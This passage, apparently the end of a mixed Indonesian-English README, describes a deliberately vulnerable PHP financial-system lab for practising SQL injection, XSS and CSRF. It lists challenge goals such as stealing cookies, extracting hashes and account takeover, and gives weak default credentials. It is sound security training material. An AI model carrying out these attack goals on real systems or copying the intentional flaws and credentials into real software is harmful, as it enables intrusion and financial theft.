✅ CSRF Tokens (cryptographically secure)
✅ Security Headers (CSP, X-Frame-Options, etc)
✅ HTTPOnly & Secure Cookies
✅ Rate Limiting
✅ Error Handling (generic messages)
✅ Logging & Monitoring
✅ Principle of Least Privilege
```

---

## 📝 Praktik Latihan

### 🎯 Challenge Path:

**Beginner (Level LOW):**
1. Extract semua usernames dari database
2. Steal admin password hash
3. Execute JavaScript untuk steal cookies
4. Change user password via CSRF

**Intermediate (Level MEDIUM):**
5. Bypass mysqli_real_escape_string dengan encoding
6. XSS tanpa menggunakan `<script>` tag
7. CSRF dengan referrer bypass
8. Blind SQLi untuk extract data tanpa error messages

**Advanced (Level HIGH):**
9. Find logic flaw saat SQLi tidak mungkin
10. Context-based XSS exploitation
11. Second-order injection
12. Chain XSS + CSRF untuk full account takeover

**Expert (Level IMPOSSIBLE):**
13. Analyze secure code implementation
14. Write security report dengan recommendations
15. Implement protections di project sendiri
16. Conduct code review for vulnerabilities

---

## ⚠️ Ethical Hacking Guidelines

**PENTING - Baca Sebelum Testing:**

✅ **BOLEH:**
- Testing di aplikasi DVWA sendiri (localhost)
- Learning & educational purposes
- Lab environment & sandboxed systems
- Bug bounty programs (dengan permission)
- Authorized penetration testing

❌ **TIDAK BOLEH:**
- Attack real production systems tanpa izin
- Test aplikasi orang lain tanpa authorization
- Illegal activities
- Cause harm atau data loss
- Share exploits untuk malicious purposes

**Legal Notice:**
> System ini SENGAJA VULNERABLE untuk educational purposes. 
> Jangan deploy ke production atau internet-facing server.
> Gunakan hanya untuk learning penetration testing secara legal dan ethical.

---

## 📁 Project Structure - Financial System

```
dvwa-system/
├── app/
│   ├── config.php              # Database config
│   ├── login.php               # English login (vulnerable SQLi)
│   ├── login_id.php            # Indonesian login - Sistem Keuangan
│   ├── dashboard.php           # English dashboard - Financial Admin
│   ├── dashboard_id.php        # Indonesian dashboard - Dashboard Keuangan
│   ├── sqli.php                # English SQLi lab - Transaction Search
│   ├── sqli_id.php             # Indonesian SQLi lab - Pencarian Transaksi
│   ├── xss_reflected.php       # English reflected XSS - Financial Report
│   ├── xss_reflected_id.php    # Indonesian reflected XSS - Laporan Keuangan
│   ├── xss_stored.php          # English stored XSS - Transaction Notes
│   ├── xss_stored_id.php       # Indonesian stored XSS - Catatan Transaksi
│   ├── csrf.php                # English CSRF lab - Change PIN
│   ├── csrf_id.php             # Indonesian CSRF lab - Ubah PIN Transaksi
│   ├── reset_db.php            # Database reset handler
│   ├── logout.php              # Logout handler
│   └── index.php               # Main entry point
├── db/
│   └── init.sql                # Database initialization
├── docker-compose.yml          # Docker Compose config
├── Dockerfile                  # PHP + Apache config
├── .gitignore
├── railway.json               # Railway deployment config
├── RAILWAY_DEPLOYMENT.md      # Detailed Railway guide
└── README.md
```

---

## 🔐 Default Credentials - Financial System

**Administrator (Full Access):**
```
Username: admin
Password: admin123
Role: Financial Administrator
Access: All financial modules, transaction approval, reports
```

**Staff (Limited Access):**
```
Username: user
Password: user123
Role: Finance Staff
Access: View transactions, add notes
```

---

## 🛠️ Tech Stack

- **Backend:** PHP 8.2
- **Database:** MariaDB 11
- **Web Server:** Apache
- **Container:** Docker & Docker Compose
- **Hosting:** Railway.app (recommended)

---

## ⚠️ Security Warning - Financial System Context

**This Financial System is INTENTIONALLY VULNERABLE!**

- ✅ Gunakan hanya untuk training & learning security dalam konteks financial applications
- ✅ Jangan deploy ke production atau gunakan dengan data finansial real
- ✅ Jangan gunakan untuk exploit real financial/banking systems
- ✅ Training ini mensimulasikan kelemahan umum dalam aplikasi keuangan
- ⚠️ Real financial systems harus implement: encryption, 2FA, audit logs, compliance standards

**Learning Objectives:**
- Memahami vulnerability dalam financial web applications
- Praktek secure coding untuk sistem keuangan
- Awareness terhadap impact finansial dari security breach
- Testing IDS/IPS rules untuk financial transaction patterns

---

## 📚 Learning Resources - Financial Security

### General Web Security:
1. **OWASP Top 10** - https://owasp.org/www-project-top-ten/
2. **PortSwigger Web Security Academy** - https://portswigger.net/web-security
3. **HackTheBox** - https://www.hackthebox.com
4. **TryHackMe** - https://tryhackme.com

### Financial & Banking Security:
5. **PCI DSS Compliance** - https://www.pcisecuritystandards.org/
6. **OWASP Financial Services** - https://owasp.org/www-industry/financial/
7. **Financial Sector Cybersecurity** - NIST Framework
8. **ISO 27001** - Information Security Management

### Recommended Testing Path:
1. Start dengan SQL Injection pada transaction search
2. Test XSS pada financial reports dan notes
3. Simulate CSRF attack pada PIN change
4. Practice IDS evasion dengan financial payloads
5. Analyze impact pada financial data integrity

---

## 📝 License

Educational Purpose Only - Use responsibly!

---

## 🤝 Contributing

Found bugs atau ingin improve? Feel free to fork & contribute!

---

**Happy Hacking! 🔥**
